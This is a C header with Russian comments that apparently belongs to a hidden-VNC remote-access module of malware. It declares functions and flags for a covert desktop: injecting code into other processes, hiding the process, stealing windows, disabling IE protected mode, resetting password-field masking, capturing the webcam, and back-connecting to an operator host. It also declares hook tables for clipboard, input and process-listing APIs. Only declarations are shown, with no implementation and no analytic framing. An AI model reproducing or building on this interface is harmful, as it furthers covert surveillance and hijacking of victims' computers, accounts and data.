#ifndef XVNC_H_INCLUDED
#define XVNC_H_INCLUDED

#define HVNC DWORD

#ifndef VNC_FLAG_VIEWONLY
struct PASSWORD_ITEM
{
    char szPassword[9];
    int dwFlags;
};

#define VNC_FLAG_VIEWONLY 1
#define VNC_FLAG_ALLOWCLIPBOARD 2
#define VNC_FLAG_ALLOWFILETRANSFER 4
#endif

#define HVNC_NO_SHELL                       0x0001 ///не запускать explorer
#define HVNC_NO_INJECTS                     0x0002 ///не инжектировать код в чужие процессы
#define HVNC_SCREEN_SIZE_DETERMINED         0x0004 ///размер экрана задан
#define HVNC_NO_VNC_CURSOR                  0x0008 ///не передавать координаты курсора VNC-клиенту
#define HVNC_USE_BITBLT                     0x0010 ///использовать BitBlt вместо PrintWindow (для input-десктопа)
#define HVNC_NO_CPU_LIMITS                  0x0020 ///не ограничивать количество процессорного времени
#define HVNC_DRAW_USER_CURSOR               0x0040 ///рисовать пользовательский курсор (не VNC!)
#define HVNC_DONT_HIDE_JAVA_ICON            0x0080 ///не скрывать значек жабы из трея
#define HVNC_DONT_DISABLE_IE_SAFEMODE       0x0100 ///не отключать защищенный режим IE
#define HVNC_DONT_DISABLE_EFFECTS           0x0200 ///не отключать эффекты
#define HVNC_NO_WINDOWS_MANIPULATION_TRICK  0x0400 ///обычное переключение окон (без трюка с MessageBox)
#define HVNC_DONT_DISABLE_THEMES            0x0800 ///не отключать темы
#define HVNC_NO_ES_PASSWORD_RESET           0x1000 ///не сбрасывать флаг ES_PASSWORD

#define NO_HACK_AND_TRICKS                  HVNC_DONT_HIDE_JAVA_ICON+HVNC_DONT_DISABLE_IE_SAFEMODE+HVNC_DONT_DISABLE_EFFECTS+HVNC_NO_WINDOWS_MANIPULATION_TRICK

#define HVNC_INPUT_DESKTOP                  HVNC_NO_SHELL+HVNC_NO_INJECTS+HVNC_USE_BITBLT+HVNC_NO_WINDOWS_MANIPULATION_TRICK+HVNC_NO_ES_PASSWORD_RESET
#define HVNC_WEB_CAM                        HVNC_NO_SHELL+HVNC_NO_INJECTS+HVNC_NO_VNC_CURSOR+HVNC_SCREEN_SIZE_DETERMINED+NO_HACK_AND_TRICKS

struct HVNC_CLIENT_INFO
{
    HVNC hVNC;
    PASSWORD_ITEM piPassword;
    sockaddr_in saClient;
    bool bGone;
};

typedef void WINAPI ClientGoneHook(HVNC_CLIENT_INFO *lpInfo);
typedef void WINAPI NewClientHook(HVNC_CLIENT_INFO *lpInfo);
typedef bool WINAPI CLIENTSENUMPROC(HVNC_CLIENT_INFO *lpInfo);

struct HVNC_INITIALIZE
{
    DWORD dwFlags;
    char szDeskName[100];
    DWORD dwWidth;
    DWORD dwHeight;
    byte bBitsPerPixel;
    ClientGoneHook *lpClientGoneHook;
    NewClientHook *lpNewClientHook;
};

#define HVNCSI_DESKNAME         0x01
#define HVNCSI_SCREENSIZE       0x02
#define HVNCSI_DESKFLAGS        0x04
#define HVNCSI_CLIENTSCOUNT     0x08
#define HVNCSI_SERVERSTATUS     0x10
#define HVNCSI_DESKTYPE         0x20

#define HVNCDT_WEBCAM           1
#define HVNCDT_HIDDENDESK       2
#define HVNCDT_INPUTDESK        3

struct HVNC_SERVER_INFO
{
    DWORD dwMask;
    char szDeskName[100];
    DWORD dwWidth;
    DWORD dwHeight;
    byte bBitsPerPixel;
    DWORD dwFlags;
    DWORD dwClientsCount;
    int dwStatus;
    DWORD dwDeskType;
};

struct PASSWORDS_LIST
{
    DWORD dwPasswordsCount;
    PASSWORD_ITEM piPasswords[10];
};

struct HVNC_CONNECTION_INFO
{
    bool bShared;
    WORD wVNCPort;
    WORD wBCPort;
    char szBCHost[50];
    PASSWORDS_LIST Passwords;
};

HVNC __cdecl VNCCreateServer(HVNC_INITIALIZE *lpVNCInit);
void __cdecl VNCDestroyServer(HVNC hVNC);
bool __cdecl VNCGetServerInfo(HVNC hVNC,HVNC_SERVER_INFO *lpInfo);

#define HVNCSF_RETURNSTOLENWNDS 1
#define HVNCSF_DESTOYSLOLENWNDS 2
bool __cdecl VNCStartServer(HVNC hVNC,HVNC_CONNECTION_INFO *lpConnInfo);
void __cdecl VNCStopServer(HVNC hVNC,DWORD dwFlags);

bool __cdecl VNCInit(bool bHideProcess);
void __cdecl VNCCleanup(bool bDestroyServers);

void __cdecl VNCSetNewPasswordsList(HVNC hVNC,bool bDisconnectLoggedUsers,PASSWORDS_LIST *lpPasswordsList);
void __cdecl VNCDisconnectUser(HVNC hVNC,char *lpPassword,in_addr dwAddr);
void __cdecl VNCDisconnectAllUsers(HVNC hVNC);
void __cdecl VNCEnumUsers(HVNC hVNC,CLIENTSENUMPROC *lpEnumProc);

bool __cdecl VNCStealWindow(HVNC hVNC,HWND hWnd);
bool __cdecl VNCReturnWindowToOwner(HVNC hVNC,HWND hWnd);

#define HVNC_ERROR -1
#define HVNC_SERVER_NOT_STARTED 0
#define HVNC_SERVER_STARTED 1

int __cdecl VNCGetServerStatus(HVNC hVNC);

struct API_HOOK_ITEM
{
    LPVOID *lpRealAddr;
    LPVOID lpHandler;
};

struct VNC_HOOKS
{
    API_HOOK_ITEM OpenDesktopA;
    API_HOOK_ITEM OpenDesktopW;
    API_HOOK_ITEM OpenInputDesktop;
    API_HOOK_ITEM SwitchDesktop;

    API_HOOK_ITEM PlaySoundW;
    API_HOOK_ITEM PlaySoundA;
    API_HOOK_ITEM sndPlaySoundW;
    API_HOOK_ITEM sndPlaySoundA;
    API_HOOK_ITEM Beep;
    API_HOOK_ITEM MessageBeep;
    API_HOOK_ITEM waveOutOpen;

    API_HOOK_ITEM GetUpdatedClipboardFormats;
    API_HOOK_ITEM CloseClipboard;
    API_HOOK_ITEM CountClipboardFormats;
    API_HOOK_ITEM EmptyClipboard;
    API_HOOK_ITEM GetClipboardData;
    API_HOOK_ITEM GetPriorityClipboardFormat;
    API_HOOK_ITEM IsClipboardFormatAvailable;
    API_HOOK_ITEM OpenClipboard;
    API_HOOK_ITEM SetClipboardData;

    API_HOOK_ITEM FlashWindowEx;
    API_HOOK_ITEM FlashWindow;
    API_HOOK_ITEM GetCursorPos;
    API_HOOK_ITEM SetCursorPos;
    API_HOOK_ITEM GetMessagePos;
    API_HOOK_ITEM SetCapture;
    API_HOOK_ITEM ReleaseCapture;
    API_HOOK_ITEM GetCapture;
    API_HOOK_ITEM DefWindowProcW;
    API_HOOK_ITEM DefWindowProcA;
    API_HOOK_ITEM DefDlgProcW;
    API_HOOK_ITEM DefDlgProcA;
    API_HOOK_ITEM DefFrameProcW;
    API_HOOK_ITEM DefFrameProcA;
    API_HOOK_ITEM DefMDIChildProcW;
    API_HOOK_ITEM DefMDIChildProcA;
    API_HOOK_ITEM CallWindowProcW;
    API_HOOK_ITEM CallWindowProcA;
    API_HOOK_ITEM GetMessageW;
    API_HOOK_ITEM GetMessageA;
    API_HOOK_ITEM PeekMessageW;
    API_HOOK_ITEM PeekMessageA;
    API_HOOK_ITEM TranslateMessage;
    API_HOOK_ITEM SetDIBitsToDevice;

    API_HOOK_ITEM TrackPopupMenuEx;

    API_HOOK_ITEM GetCaretBlinkTime;
};

struct COMMON_HOOKS
{
    API_HOOK_ITEM ZwQuerySystemInformation;
    API_HOOK_ITEM SetThreadDesktop;
    API_HOOK_ITEM ShowWindow;
};

void WINAPI RemoteThread(LPVOID dwHash);

void __cdecl InjLibCleanup();
void __cdecl InjLibInit();

bool __cdecl HVNCIsAlive(DWORD dwTimeOut);
bool __cdecl HVNCInjLibIsAlive(DWORD dwTimeOut);
HANDLE __cdecl RegisterHiddenProcess();

void __cdecl InitVNCHooks(VNC_HOOKS *lpVNCHooks);
void __cdecl InitCommonHooks(COMMON_HOOKS *lpCommonHooks);
void __cdecl RemoveCommonHooks();

DWORD __cdecl GetVIDDevCount();
#define IsCamPresent() GetVIDDevCount() > 0

#endif // XVNC_H_INCLUDED
